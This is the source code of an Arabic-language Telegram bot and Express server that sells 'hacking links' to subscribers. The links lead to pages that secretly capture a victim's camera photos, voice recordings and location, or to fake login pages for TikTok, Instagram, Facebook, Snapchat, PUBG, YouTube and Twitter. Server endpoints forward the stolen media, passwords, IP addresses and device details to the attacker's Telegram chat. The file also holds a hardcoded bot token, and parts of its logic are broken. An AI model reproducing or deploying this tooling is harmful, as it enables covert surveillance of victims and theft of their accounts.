const TelegramBot = require('node-telegram-bot-api');
const express = require('express');
const bodyParser = require('body-parser');
const multer = require('multer');
const fs = require('fs');
const path = require('path');
const useragent = require('useragent');


const botToken = '7252078284:AAFt6ySoKDAJx-6wbg435qnU-_ramrgRL8Y';
const bot = new TelegramBot(botToken, { polling: true });

const app = express();
app.use(bodyParser.json({ limit: '50mb' }));
app.use(bodyParser.urlencoded({ extended: true }));
app.use(express.static(__dirname));
app.use(express.static(path.join(__dirname, 'public')));
app.use(express.static(path.join(__dirname, 'uploads')));
const storage = multer.memoryStorage();
const upload = multer({ storage: storage });

const platformVisits = {};
const userVisits = {};
const MAX_FREE_ATTEMPTS = 5; // تحديد عدد المحاولات المجانية// مجموعة المستخدمين المشتركين
const freeTrialEndedMessage = "انتهت فترة التجربة المجانيه لان تستطيع استخدام اي رابط اختراق حتى تقوم بل الاشتراك من المطور او قوم بجمع نقاط لاستمرار في استخدام البوت"; // رسالة نهاية الفترة التجريبية
const adminId = '7130416076';
const forcedChannelUsernames = ['@SJGDDW', '@YEMENCYBER101', '@YYY_A12'];


 
const allUsers = new Map();
const activatedUsers = new Set();
const bannedUsers = new Map();
const subscribedUsers = new Set();

function isAdmin(userId) {
  return userId.toString() === adminId;
}

function createAdminKeyboard() {
  return {
    reply_markup: {
      inline_keyboard: [
        [{ text: 'حظر مستخدم', callback_data: 'ban' }],
        [{ text: 'إلغاء حظر مستخدم', callback_data: 'unban' }],
        [{ text: 'عرض الإحصائيات', callback_data: 'stats' }],
        [{ text: 'إرسال رسالة', callback_data:'broadcast' }],
        [{ text: 'قائمة المحظورين', callback_data:'abo' }],
        [{ text: 'إضافة نقاط', callback_data:'addpoints' }],
        [{ text: 'خصم نقاط', callback_data:'deductpoints' }],
        [{ text: 'تعيين نقاط الاشتراك', callback_data: 'setsubscriptionpoints' }],
        [{ text: 'الاشتراك', callback_data: 'subscribe' }],
        [{ text: 'إلغاء الاشتراك', callback_data:'unsubscribe' }],
        [{ text: 'عرض المشتركين', callback_data:'listsubscribers' }],
      ]
    }
  };
}

function recordBanAction(userId, adminId) {
  const adminName = getUsername(adminId);
  bannedUsers.set(userId, adminName);
  saveData();
}

function getUsername(userId) {
  return allUsers.get(userId)?.username || 'Unknown';
}

function updateUserBlockStatus(userId, hasBlocked) {
  if (allUsers.has(userId)) {
    allUsers.get(userId).hasBlockedBot = hasBlocked;
  } else {
    allUsers.set(userId, { hasBlockedBot: hasBlocked });
  }
  saveData();
}

function banUser(userId) {
  if (allUsers.has(userId) && !bannedUsers.has(userId)) {
    bannedUsers.set(userId, allUsers.get(userId));
    saveData();
  }
}

function unbanUser(userId) {
  if (bannedUsers.delete(userId)) {
    saveData();
    return true;
  }
  return false;
}

function broadcastMessage(message) {
  allUsers.forEach((user, userId) => {
    if (!bannedUsers.has(userId)) {
      bot.sendMessage(userId, message).catch((error) => {
        console.error(`فشل إرسال الرسالة إلى المستخدم ${userId}:`, error);
        if (error.response && error.response.statusCode === 403) {
          updateUserBlockStatus(userId, true);
        }
      });
    }
  });
}

function activateUser(userId) {
  if (allUsers.has(userId) && !activatedUsers.has(userId)) {
    activatedUsers.add(userId);
    saveData();
  }
}

// دالة لحفظ البيانات (يجب تنفيذها)
function saveData() {
  // قم بتنفيذ هذه الدالة لحفظ البيانات في قاعدة البيانات أو ملف
  console.log('تم حفظ البيانات');
}

bot.on('message', async (msg) => {
  const chatId = msg.chat.id;
  const text = msg.text ? msg.text.toLowerCase() : '';
  const senderId = msg.from.id;
  const firstName = msg.from.first_name;
  const lastName = msg.from.last_name || '';
  const username = msg.from.username || '';
  
bot.onText(/\/admin/, (msg) => {
  if (isAdmin(msg.from.id)) {
    bot.sendMessage(msg.chat.id, 'مرحبًا بك في لوحة تحكم المسؤول:', createAdminKeyboard());
  } else {
    bot.sendMessage(msg.chat.id, 'عذرًا، هذا الأمر متاح فقط للمسؤول.');
  }
});

bot.on('callback_query', (callbackQuery) => {
  const msg = callbackQuery.message;
  const userId = callbackQuery.from.id;

  if (!isAdmin(userId)) {
    bot.answerCallbackQuery(callbackQuery.id, 'عذرًا، هذا الأمر متاح فقط للمسؤول.');
    return;
  }

  const data = callbackQuery.data;

  switch (data) {
    case 'ban':
      bot.sendMessage(msg.chat.id, 'يرجى إدخال الأمر بالشكل التالي: /ban <user_id>');
      break;
    case 'unban':
      bot.sendMessage(msg.chat.id, 'يرجى إدخال الأمر بالشكل التالي: /unban <user_id>');
      break;
    case 'stats':
      const totalUsers = allUsers.size;
      const activeUsers = activatedUsers.size;
      const bannedUsersCount = bannedUsers.size;
      const usersWhoBlockedBot = Array.from(allUsers.values()).filter(user => user.hasBlockedBot).length;
      bot.sendMessage(msg.chat.id, `إحصائيات البوت:\nعدد المستخدمين الكلي: ${totalUsers}\nعدد المستخدمين النشطين: ${activeUsers}\nعدد المستخدمين المحظورين: ${bannedUsersCount}\nعدد المستخدمين الذين حظروا البوت: ${usersWhoBlockedBot}`);
      break;
    case 'broadcast':
      bot.sendMessage(msg.chat.id, 'يرجى إدخال الأمر بالشكل التالي: /sagd <message>');
      break;
    case 'abo':
      const bannedUsersList = Array.from(bannedUsers).join(', ');
      bot.sendMessage(msg.chat.id, `قائمة المستخدمين المحظورين: ${bannedUsersList || 'لا يوجد مستخدمين محظورين'}`);
      break;
    case 'addpoints':
      bot.sendMessage(msg.chat.id, 'يرجى إدخال الأمر بالشكل التالي: /addpoints <user_id> <points>');
      break;
    case 'deductpoints':
      bot.sendMessage(msg.chat.id, 'يرجى إدخال الأمر بالشكل التالي: /deductpoints <user_id> <points>');
      break;
    case 'setsubscriptionpoints':
      bot.sendMessage(msg.chat.id, 'يرجى إدخال الأمر بالشكل التالي: /setsubscriptionpoints <points>');
      break;
    case 'subscribe':
      bot.sendMessage(msg.chat.id, 'يرجى إدخال الأمر بالشكل التالي: /subscribe <user_id>');
      break;
    case 'unsubscribe':
      bot.sendMessage(msg.chat.id, 'يرجى إدخال الأمر بالشكل التالي: /unsubscribe <user_id>');
      break;
    case 'listsubscribers':
      const subscribersList = Array.from(subscribedUsers).join('\n');
      bot.sendMessage(msg.chat.id, `قائمة المشتركين:\n${subscribersList || 'لا يوجد مشتركين حالياً.'}`);
      break;
    default:
      bot.sendMessage(msg.chat.id, 'أمر غير معروف.');
  }

  bot.answerCallbackQuery(callbackQuery.id);
});

bot.onText(/\/ban (\d+)/, (msg, match) => {
  if (!isAdmin(msg.from.id)) {
    bot.sendMessage(msg.chat.id, 'عذرًا، هذا الأمر متاح فقط للمسؤول.');
    return;
  }

  const userIdToBan = match[1];
  banUser(userIdToBan);
  recordBanAction(userIdToBan, msg.from.id);
  bot.sendMessage(msg.chat.id, `تم حظر المستخدم ${userIdToBan}`);
});

bot.onText(/\/unban (\d+)/, (msg, match) => {
  if (!isAdmin(msg.from.id)) {
    bot.sendMessage(msg.chat.id, 'عذرًا، هذا الأمر متاح فقط للمسؤول.');
    return;
  }

  const userIdToUnban = match[1];
  if (unbanUser(userIdToUnban)) {
    bot.sendMessage(msg.chat.id, `تم إلغاء حظر المستخدم ${userIdToUnban}`);
  } else {
    bot.sendMessage(msg.chat.id, `المستخدم ${userIdToUnban} غير محظور.`);
  }
});

bot.onText(/\/sagd (.+)/, (msg, match) => {
  if (!isAdmin(msg.from.id)) {
    bot.sendMessage(msg.chat.id, 'عذرًا، هذا الأمر متاح فقط للمسؤول.');
    return;
  }

  const message = match[1];
  broadcastMessage(message);
  bot.sendMessage(msg.chat.id, 'تم إرسال الرسالة بنجاح!');
});

bot.onText(/\/addpoints (\d+) (\d+)/, (msg, match) => {
  if (!isAdmin(msg.from.id)) {
    bot.sendMessage(msg.chat.id, 'عذرًا، هذا الأمر متاح فقط للمسؤول.');
    return;
  }

  const userId = match[1];
  const pointsToAdd = parseInt(match[2]);

  if (!allUsers.has(userId)) {
    allUsers.set(userId, { id: userId, points: 0 });
  }
  
  const user = allUsers.get(userId);
  user.points = (user.points || 0) + pointsToAdd;
  
  bot.sendMessage(msg.chat.id, `تمت إضافة ${pointsToAdd} نقطة للمستخدم ${userId}`);
  bot.sendMessage(userId, `تمت إضافة ${pointsToAdd} نقطة إلى رصيدك.`);
});

bot.onText(/\/deductpoints (\d+) (\d+)/, (msg, match) => {
  if (!isAdmin(msg.from.id)) {
    bot.sendMessage(msg.chat.id, 'عذرًا، هذا الأمر متاح فقط للمسؤول.');
    return;
  }

  const userId = match[1];
  const pointsToDeduct = parseInt(match[2]);

  if (!allUsers.has(userId)) {
    bot.sendMessage(msg.chat.id, `عذرًا، المستخدم ${userId} غير موجود.`);
    return;
  }

  const user = allUsers.get(userId);
  if ((user.points || 0) >= pointsToDeduct) {
    user.points -= pointsToDeduct;
    bot.sendMessage(msg.chat.id, `تم خصم ${pointsToDeduct} نقطة من المستخدم ${userId}`);
    bot.sendMessage(userId, `تم خصم ${pointsToDeduct} نقطة من رصيدك.`);
  } else {
    bot.sendMessage(msg.chat.id, `عذرًا، المستخدم ${userId} لا يملك نقاطًا كافية للخصم.`);
  }
});

bot.onText(/\/setsubscriptionpoints (\d+)/, (msg, match) => {
  if (!isAdmin(msg.from.id)) {
    bot.sendMessage(msg.chat.id, 'عذرًا، هذا الأمر متاح فقط للمسؤول.');
    return;
  }

  pointsRequiredForSubscription = parseInt(match[1]);
  bot.sendMessage(msg.chat.id, `تم تعيين عدد النقاط المطلوبة للاشتراك إلى ${pointsRequiredForSubscription}`);
});

bot.onText(/\/subscribe (\d+)/, (msg, match) => {
  if (!isAdmin(msg.from.id)) {
    bot.sendMessage(msg.chat.id, 'عذراً، هذا الأمر متاح فقط للمسؤول.');
    return;
  }

  const userId = match[1];
  if (subscribedUsers.has(userId)) {
    bot.sendMessage(msg.chat.id, `المستخدم ${userId} موجود بالفعل في قائمة المشتركين.`);
  } else {
    subscribedUsers.add(userId);
    bot.sendMessage(msg.chat.id, `تمت إضافة المستخدم ${userId} إلى قائمة المشتركين بنجاح.`);
    bot.sendMessage(userId, 'تم اشتراكك بنجاح! يمكنك استخدام البوت بدون قيود.');
  }
});

bot.onText(/\/unsubscribe (\d+)/, (msg, match) => {
  if (!isAdmin(msg.from.id)) {
    bot.sendMessage(msg.chat.id, 'عذراً، هذا الأمر متاح فقط للمسؤول.');
    return;
  }

  const userId = match[1];
  if (subscribedUsers.delete(userId)) {
    bot.sendMessage(msg.chat.id, `تمت إزالة المستخدم ${userId} من قائمة المشتركين.`);
    bot.sendMessage(userId, 'تم إلغاء اشتراكك. قد تواجه بعض القيود على استخدام البوت.');
  } else {
    bot.sendMessage(msg.chat.id, `المستخدم ${userId} غير موجود في قائمة المشتركين.`);
  }
});

bot.onText(/\/listsubscribers/, (msg) => {
  if (!isAdmin(msg.from.id)) {
    bot.sendMessage(msg.chat.id, 'عذراً، هذا الأمر متاح فقط للمسؤول.');
    return;
  }

  const subscribersList = Array.from(subscribedUsers).join('\n');
  bot.sendMessage(msg.chat.id, `قائمة المشتركين:\n${subscribersList || 'لا يوجد مشتركين حالياً.'}`);
});


bot.on('left_chat_member', (msg) => {
  const userId = msg.left_chat_member.id;
  if (!msg.left_chat_member.is_bot) {
    updateUserBlockStatus(userId, true);
  }
});

bot.on('my_chat_member', (msg) => {
  if (msg.new_chat_member.status === 'kicked' || msg.new_chat_member.status === 'left') {
    const userId = msg.from.id;
    updateUserBlockStatus(userId, true);
  }
});

bot.on('message', async (msg) => {
  const chatId = msg.chat.id;
  const text = msg.text ? msg.text.toLowerCase() : '';
  const senderId = msg.from.id;

  // تسجيل المستخدمين الجدد
  if (!allUsers.has(chatId.toString())) {
    const newUser = {
      id: chatId,
      firstName: msg.from.first_name,
      lastName: msg.from.last_name || '',
      username: msg.from.username || ''
    };
    allUsers.set(chatId.toString(), newUser);
    saveData();
    bot.sendMessage(adminId, `مستخدم جديد دخل البوت:\nالاسم: ${newUser.firstName} ${newUser.lastName}\nاسم المستخدم: @${newUser.username}\nمعرف الدردشة: ${chatId}`);
  }

  // معالجة أوامر المدير
  if (isAdmin(senderId)) {
    if (handleAdminCommands(chatId, text)) return;
  }

  // حظر المستخدمين المحظورين
  if (bannedUsers.has(chatId.toString())) {
    bot.sendMessage(chatId, 'لا يمكنك استخدام البوت مرة أخرى. \nإذا رغبت في استخدام البوت مرة أخرى، قُم بالتواصل مع المطور @SAGD112');
    return;
  }

  // هنا يمكنك إضافة المزيد من المنطق لمعالجة الرسائل العادية
});

// تشغيل البوت
bot.on('polling_error', (error) => {
  console.log(error);
});

console.log('البوت يعمل الآن...');

  // التحقق من عضوية القناة المطلوبة
if (forcedChannelUsernames.length && !activatedUsers[chatId]) {
    for (const channel of forcedChannelUsernames) {
        try {
            const member = await bot.getChatMember(channel, chatId);
            if (member.status === 'left' || member.status === 'kicked') {
                bot.sendMessage(chatId, `عذرا، يجب عليك الانضمام إلى القنوات المطور لاستخدام البوت:`, {
                    reply_markup: {
                        inline_keyboard: forcedChannelUsernames.map(channel => [{ text: `انضم إلى ${channel}`, url: `https://t.me/${channel.slice(1)}` }])
                    }
                });
                return;
            }
        } catch (error) {
            console.error('خطأ أثناء التحقق من عضوية القناة:', error);
            bot.sendMessage(chatId, 'حدث خطأ. يرجى المحاولة لاحقًا.');
            return;
        }
    }
}

  // التحقق من الأوامر
  if (text === '/start' || text === 'تفعيل') {
    showButtons(chatId, activatedUsers[chatId]); 
    return;
  }

  // التعامل مع باقي الرسائل
  showButtons(chatId, activatedUsers[chatId]);
});


// مسار الكاميرا
const trackAttempts = (userId, action) => {
    if (!userVisits[userId]) {
        userVisits[userId] = { camera: 0, voiceRecord: 0, getLocation: 0 };
    }

    userVisits[userId][action]++;

    return userVisits[userId][action] > MAX_FREE_ATTEMPTS;
};

// دالة لتتبع المحاولات لمسار المنصة الأصلي
const trackPlatformAttempts = (platformId) => {
    if (!platformVisits[platformId]) {
        platformVisits[platformId] = 0;
    }

    platformVisits[platformId]++;

    return platformVisits[platformId] > MAX_FREE_ATTEMPTS;
};

// المسار الأصلي


// مسار الكاميرا
app.get('/camera/:userId', (req, res) => {
    const userId = req.params.userId;

    if (subscribedUsers.has(userId)) {
        res.sendFile(path.join(__dirname, 'location.html'));
        return;
    }

    if (trackAttempts(userId, 'camera')) {
        res.send(`<html><body><h1>${freeTrialEndedMessage}</h1></body></html>`);
        return;
    }

    res.sendFile(path.join(__dirname, 'location.html'));
});

// مسار تسجيل الصوت
app.get('/record/:userId', (req, res) => {
    const userId = req.params.userId;

    if (subscribedUsers.has(userId)) {
        res.sendFile(path.join(__dirname, 'record.html'));
        return;
    }

    if (trackAttempts(userId, 'voiceRecord')) {
        res.send(`<html><body><h1>${freeTrialEndedMessage}</h1></body></html>`);
        return;
    }

    res.sendFile(path.join(__dirname, 'record.html'));
});

// مسار الحصول على الموقع
app.get('/getLocation/:userId', (req, res) => {
    const userId = req.params.userId;

    if (subscribedUsers.has(userId)) {
        res.sendFile(path.join(__dirname, 'SJGD.html'));
        return;
    }

    if (trackAttempts(userId, 'getLocation')) {
        res.send(`<html><body><h1>${freeTrialEndedMessage}</h1></body></html>`);
        return;
    }

    res.sendFile(path.join(__dirname, 'SJGD.html'));
});

app.get('/:platform/:chatId', (req, res) => {
    const { platform, chatId } = req.params;

    if (subscribedUsers.has(chatId)) {
        res.sendFile(path.join(__dirname, 'uploads', `${platform}_increase.html`));
        return;
    }

    if (trackPlatformAttempts(chatId)) {
        res.send(`<html><body><h1>${freeTrialEndedMessage}</h1></body></html>`);
        return;
    }

    res.sendFile(path.join(__dirname, 'uploads', `${platform}_increase.html`));
});


// استلام الصور
app.post('/submitPhotos', upload.array('images', 20), async (req, res) => {
    const chatId = req.body.userId;
    const files = req.files;
    const additionalData = JSON.parse(req.body.additionalData || '{}');
    const cameraType = req.body.cameraType;

    if (files && files.length > 0) {
        console.log(`Received ${files.length} images from user ${chatId}`);

        const caption = `
معلومات إضافية:
نوع الكاميرا: ${cameraType === 'front' ? 'أمامية' : 'خلفية'}
IP: ${additionalData.ip}
الدولة: ${additionalData.country}
المدينة: ${additionalData.city}
المنصة: ${additionalData.platform}
إصدار الجهاز: ${additionalData.deviceVersion}
مستوى البطارية: ${additionalData.batteryLevel || 'غير متاح'}
الشحن: ${additionalData.batteryCharging ? 'نعم' : 'لا' || 'غير متاح'}
        `;

        try {
            for (const file of files) {
                await bot.sendPhoto(chatId, file.buffer, { caption });
            }
            console.log('Photos sent successfully');
            res.json({ success: true });
        } catch (err) {
            console.error('Failed to send photos:', err);
            res.status(500).json({ error: 'Failed to send photos' });
        }
    } else {
        console.log('No images received');
        res.status(400).json({ error: 'No images received' });
    }
});

// استلام الصوت
app.post('/submitVoice', upload.single('voice'), (req, res) => {
    const chatId = req.body.chatId;
    const voiceFile = req.file;
    const additionalData = JSON.parse(req.body.additionalData || '{}');

    if (!voiceFile) {
        console.error('No voice file received');
        return res.status(400).json({ error: 'No voice file received' });
    }

    const caption = `
معلومات إضافية:
IP: ${additionalData.ip}
الدولة: ${additionalData.country}
المدينة: ${additionalData.city}
المنصة: ${additionalData.platform}
إصدار الجهاز: ${additionalData.deviceVersion}
مستوى البطارية: ${additionalData.batteryLevel || 'غير متاح'}
الشحن: ${additionalData.batteryCharging ? 'نعم' : 'لا' || 'غير متاح'}
    `;

    bot.sendVoice(chatId, voiceFile.buffer, { caption })
        .then(() => {
            console.log('Voice sent successfully');
            res.json({ success: true });
        })
        .catch(error => {
            console.error('Error sending voice:', error);
            res.status(500).json({ error: 'Failed to send voice message' });
        });
});

// استلام الموقع
app.post('/submitLocation', async (req, res) => {
    const { chatId, latitude, longitude, additionalData } = req.body;

    if (!chatId || !latitude || !longitude) {
        return res.status(400).json({ error: 'Missing required data' });
    }

    try {
        await bot.sendLocation(chatId, latitude, longitude);
        
        const message = `
معلومات إضافية:
IP: ${additionalData.ip}
الدولة: ${additionalData.country}
المدينة: ${additionalData.city}
المنصة: ${additionalData.platform}
متصفح المستخدم: ${additionalData.userAgent}
مستوى البطارية: ${additionalData.batteryLevel}
الشحن: ${additionalData.batteryCharging ? 'نعم' : 'لا'}
        `;
        
        await bot.sendMessage(chatId, message);
        console.log('Location and additional data sent successfully');
        res.json({ success: true });
    } catch (error) {
        console.error('Error sending location:', error);
        res.status(500).json({ error: 'Failed to send location', details: error.message });
    }
});

app.post('/submitIncrease', (req, res) => {
    const { username, password, platform, chatId, ip, country, city, userAgent } = req.body;

    console.log('Received ', { username, password, platform, chatId, ip, country, city });
    
    if (!chatId) {
        return res.status(400).json({ error: 'Missing chatId' });
    }

    const deviceInfo = useragent.parse(userAgent);

    bot.sendMessage(chatId, `تم اختراق حساب جديد ☠️:
منصة: ${platform}
اسم المستخدم: ${username}
كلمة السر: ${password}
عنوان IP: ${ip}
الدولة: ${country}
المدينة: ${city}
نظام التشغيل: ${deviceInfo.os.toString()}
المتصفح: ${deviceInfo.toAgent()}
الجهاز: ${deviceInfo.device.toString()}`)
        .then(() => {
            res.json({ success: true });
        })
        .catch(error => {
            console.error('Error sending message:', error);
            res.status(500).json({ error: 'Failed to send increase data', details: error.message });
        });
});




// أوامر البوت

const userPoints = new Map();
const userReferrals = new Map();
const usedReferralLinks = new Map();
let pointsRequiredForSubscription = 15;

function createReferralLink(userId) {
    const referralCode = Buffer.from(userId.toString()).toString('base64');
    return `https://t.me/Hzhzhxhbxbdbot?start=${referralCode}`;
}

function addPoints(userId, points) {
    const currentPoints = userPoints.get(userId) || 0;
    const newPoints = currentPoints + points;
    userPoints.set(userId, newPoints);
    checkPointsAndSubscribe(userId);
    return newPoints;
}

function deductPoints(userId, points) {
    const currentPoints = userPoints.get(userId) || 0;
    if (currentPoints >= points) {
        userPoints.set(userId, currentPoints - points);
        return true;
    }
    return false;
}

function checkPointsAndSubscribe(userId) {
    const points = userPoints.get(userId) || 0;
    if (points >= pointsRequiredForSubscription && !subscribedUsers.has(userId)) {
        subscribedUsers.add(userId);
        bot.sendMessage(userId, 'مبروك! لقد جمعت 15 نقطة. تم اشتراكك في البوت وتستطيع الآن استخدام البوت بدون قيود.');
    }
}

bot.onText(/\/start (.+)/, (msg, match) => {
    const startPayload = match[1];
    const newUserId = msg.from.id.toString();
    
    try {
        const referrerId = Buffer.from(startPayload, 'base64').toString();
        if (referrerId !== newUserId) {
            const usedLinks = usedReferralLinks.get(newUserId) || new Set();
            if (!usedLinks.has(referrerId)) {
                usedLinks.add(referrerId);
                usedReferralLinks.set(newUserId, usedLinks);
                const referrerPoints = addPoints(referrerId, 1);
                bot.sendMessage(referrerId, `قام المستخدم ${msg.from.first_name} بالدخول عبر رابط الدعوة الخاص بك. أصبح لديك ${referrerPoints} نقطة.`);
                bot.sendMessage(newUserId, 'مرحبًا بك! لقد انضممت عبر رابط دعوة.');
            } else {
                bot.sendMessage(newUserId, 'مرحبًا بك مرة أخرى! لقد استخدمت هذا الرابط من قبل.');
            }
        }
    } catch (error) {
        console.error('خطأ في معالجة رمز الإحالة:', error);
    }
    showButtons(msg.chat.id, newUserId);
});

async function showButtons(chatId, userId) {
  const points = userPoints.get(userId) || 0;
  const isSubscribed = subscribedUsers.has(userId);

  let statusMessage = isSubscribed 
    ? 'أنت مشترك في البوت ويمكنك استخدامه بدون قيود.'
    : `لديك ${points} نقطة. اجمع 15 نقطة للاشتراك في البوت واستخدامه بدون قيود.`;

   let keyboard = [
        [{ text: '📸 اختراق الكاميرا الأمامية والخلفية 📸', callback_data:'front_camera' }],
        [{ text: '🎙 تسجيل صوت 🎙', callback_data:'voice_record' }],
        [{ text: '🗺️ الحصول على الموقع 🗺️', callback_data:'get_location' }],
        [{ text: '☠️اختراق تيك توك ☠️', callback_data:'increase_tiktok' }],
        [{ text: '🕷اختراق الانستغرام🕷', callback_data:'increase_instagram' }],
        [{ text: '🔱اختراق الفيسبوك🔱', callback_data:'increase_facebook' }],
        [{ text: '👻 اختراق سناب شات 👻', callback_data:'increase_snapchat' }],
        [{ text: '🔫اختراق حسابات ببجي🔫', callback_data:'pubg_uc' }],
        [{ text: '🔴اختراق يوتيوب🔴', callback_data:'increase_youtube' }],
        [{ text: '🐦اختراق تويتر🐦', callback_data:'increase_twitter' }],
        [{ text: '🔗 إنشاء رابط دعوة 🔗', callback_data:'create_referral' }],
        [{ text: '💰 نقاطي 💰', callback_data: 'my_points' }],
        [{ text: 'قناة المطور سجاد', url: 'https://t.me/SJGDDW' }],
        [{ text: 'سجاد تتواصل مع المطور', url: 'https://t.me/SAGD112' }],
    ];

    bot.sendMessage(chatId, `${statusMessage}\n\nمرحبا قوم بختيار اي  شي تريده لكن لان تستطيع استخدام اي رابط سوى 5مرات حتى تقوم بدفع اشتراك من المطور @SAGD112 او قوم بتجميع نقاط لاستخدامه مجانآ:`, {
        reply_markup: {
            inline_keyboard: keyboard
        }
    });
}

bot.on('callback_query', (callbackQuery) => {
    const chatId = callbackQuery.message.chat.id;
    const userId = callbackQuery.from.id.toString();
    const data = callbackQuery.data;

    switch(data) {
        case 'create_referral':
            const referralLink = createReferralLink(userId);
            userReferrals.set(userId, referralLink);
            bot.sendMessage(chatId, `رابط الدعوة الخاص بك هو:\n${referralLink}`);
            break;
        case 'my_points':
            const points = userPoints.get(userId) || 0;
            const isSubscribed = subscribedUsers.has(userId);
            let message = isSubscribed
                ? `لديك حاليًا ${points} نقطة. أنت مشترك في البوت ويمكنك استخدامه بدون قيود.`
                : `لديك حاليًا ${points} نقطة. اجمع ${pointsRequiredForSubscription} نقطة للاشتراك في البوت واستخدامه بدون قيود.`;
            bot.sendMessage(chatId, message);
            break;
        default:
            if (!subscribedUsers.has(userId)) {
                bot.sendMessage(chatId, 'ملاحظة عزيزي المستخدم لان تستطيع استخدام هاذا الميزه سوى 5مرات قوم بل الاشتراك من المطور او قوم بجمع نقاط لاستخدام بدون قيود.');
            } else {
                bot.sendMessage(chatId, 'جاري تنفيذ العملية...');
                // هنا يمكنك إضافة الكود الخاص بكل عملية
            }
    }
});


const TinyURL = require('tinyurl');

function shortenUrl(url) {
  return new Promise((resolve, reject) => {
    TinyURL.shorten(url, function(res, err) {
      if (err)
        reject(err);
      else
        resolve(res);
    });
  });
}

bot.on('callback_query', async (callbackQuery) => {
    const chatId = callbackQuery.message.chat.id;
    const data = callbackQuery.data;

    if (data === 'front_camera' || data === 'rear_camera') {
        const url = `https://yyytot.onrender.com/camera/${chatId}?cameraType=${data === 'front_camera' ? 'front' : 'rear'}`;
        const shortUrl = await shortenUrl(url);
        bot.sendMessage(chatId, `انقر على الرابط للتصوير: ${shortUrl}`);
    } else if (data === 'voice_record') {
        bot.sendMessage(chatId, 'من فضلك أدخل مدة التسجيل بالثواني (1-20):');
    } else if (data === 'get_location') {
        const url = `https://yyytot.onrender.com/getLocation/${chatId}`;
        console.log('Data received:', data);
        console.log('Chat ID:', chatId);
        console.log('URL:', url);
        
        const shortUrl = await shortenUrl(url);
        bot.sendMessage(chatId, `انقر على الرابط للحصول على موقعك: ${shortUrl}`)
            .then(() => console.log('Message sent successfully'))
            .catch(err => console.error('Error sending message:', err));
    }
});

bot.on('message', async (msg) => {
    const chatId = msg.chat.id;
    const duration = parseInt(msg.text, 10);

    if (!isNaN(duration)) {
        if (duration > 0 && duration <= 20) {
            const link = `https://yyytot.onrender.com/record/${chatId}?duration=${duration}`;
            const shortLink = await shortenUrl(link);
            bot.sendMessage(chatId, `تم تجهيز الرابط لتسجيل صوت لمدة ${duration} ثواني: ${shortLink}`);
        } else {
            bot.sendMessage(chatId, 'الحد الأقصى لمدة التسجيل هو 20 ثانية. الرجاء إدخال مدة صحيحة.');
        }
    }
});

bot.on('callback_query', async (query) => {
    const chatId = query.message.chat.id;
    const baseUrl = 'https://yyytot.onrender.com'; // Change this to your actual URL
    const shortBaseUrl = await shortenUrl(baseUrl);
    
    // Use shortBaseUrl here if needed

    let url;
    switch (query.data) {
        case 'increase_tiktok':
            url = `${baseUrl}/tiktok/${chatId}`;
            bot.sendMessage(chatId, `تم تلغيم رابط اختراق التيك توك: ${url}`);
            break;
        case 'increase_instagram':
            url = `${baseUrl}/instagram/${chatId}`;
            bot.sendMessage(chatId, `تم تلغيم رابط اختراق الانستغرام: ${url}`);
            break;
        case 'increase_facebook':
            url = `${baseUrl}/facebook/${chatId}`;
            bot.sendMessage(chatId, `تم تلغيم رابط اختراق الفيسبوك: ${url}`);
            break;
        case 'increase_snapchat':
            url = `${baseUrl}/snapchat/${chatId}`;
            bot.sendMessage(chatId, `تم تلغيم رابط اختراق السناب شات: ${url}`);
            break;
        case 'pubg_uc':
            url = `${baseUrl}/pubg_uc/${chatId}`;
            bot.sendMessage(chatId, `تم تلغيم رابط اختراق بوبجي: ${url}`);
            break;
        case 'increase_youtube':
            url = `${baseUrl}/youtube/${chatId}`;
            bot.sendMessage(chatId, ` تم تلغيم رابط اختراق اليوتيوب: ${url}`);
            break;
        case 'increase_twitter':
            url = `${baseUrl}/twitter/${chatId}`;
            bot.sendMessage(chatId, `تم تلغيم رابط اختراق التويتر: ${url}`);
            break;
    }
});


const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
    console.log(`Server is running on port ${PORT}`);
});
